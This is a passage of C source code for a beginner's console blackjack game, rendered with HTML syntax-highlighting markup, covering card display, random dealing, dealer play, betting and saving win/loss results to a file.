operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Generates random card</span><span class="token punctuation">{</span>     <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>     random_card <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>            <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>         <span class="token keyword">return</span> l<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function   </span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Plays game</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// holds value of player_total</span>     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// counter for asking user to hold or stay (aka game turns)</span>     <span class="token keyword">char</span> choice3<span class="token punctuation">;</span>     cash <span class="token operator">=</span> cash<span class="token punctuation">;</span>     <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCash: $%d\n"</span><span class="token punctuation">,</span>cash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints amount of cash user has</span>     <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random card</span>     player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes player total</span>     p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints player total</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes and prints dealer total</span>     <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prompts user to enter bet amount</span>     <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//While loop used to keep asking user to hit or stay at most twenty-one times</span>                  <span class="token comment" spellcheck="true">//  because there is a chance user can generate twenty-one consecutive 1's</span>     <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If user total is 21, win</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is over 21, loss</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWoah Buddy, You Went WAY over.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is less than 21, ask to hit or stay</span>         <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nWould You Like to Hit or Stay?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>             <span class="token punctuation">{</span>                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please Enter H to Hit or S to Stay.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Hit, continues</span>             <span class="token punctuation">{</span>                  <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span>                 p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Is dealer total is 21, loss</span>                  <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer total is over 21, win</span>                  <span class="token punctuation">{</span>                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has Went Over!. You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Stay, does not continue</span>             <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span><span class="token punctuation">,</span> player_total<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>          <span class="token punctuation">}</span>             i<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//While player total and dealer total are less than 21, re-do while loop </span>     <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End While Loop</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> z<span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>      z<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is 10 or less, keep that value</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span>z<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is more than 11, change value to 10</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span>      <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>     dealer_total <span class="token operator">=</span> dealer_total <span class="token operator">+</span> d<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThe Dealer Has a Total of %d"</span><span class="token punctuation">,</span> dealer_total<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints dealer total</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function </span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token punctuation">{</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//If stay selected, dealer continues going</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">>=</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">>=</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is more than dealer's total, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is less than dealer's total, loss</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer's total is more than 21, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>cash <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Once user has zero remaining cash, game ends and prompts user to play again</span>     <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Bankrupt. Game Over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>        <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to play again</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould You Like To Play Again?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nPlease Enter Y for Yes or N for No\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBYE!!!!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token punctuation">{</span>    FILE <span class="token operator">*</span>fpresults<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//File pointer is fpresults</span>    fpresults <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>RESULTS<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Creates file and writes into it</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpresults <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// what to do if file missing from directory</span>    <span class="token punctuation">{</span>               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nError: File Missing\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>          <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t RESULTS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t---------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Won %d Times\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Lost %d Times\n"</span><span 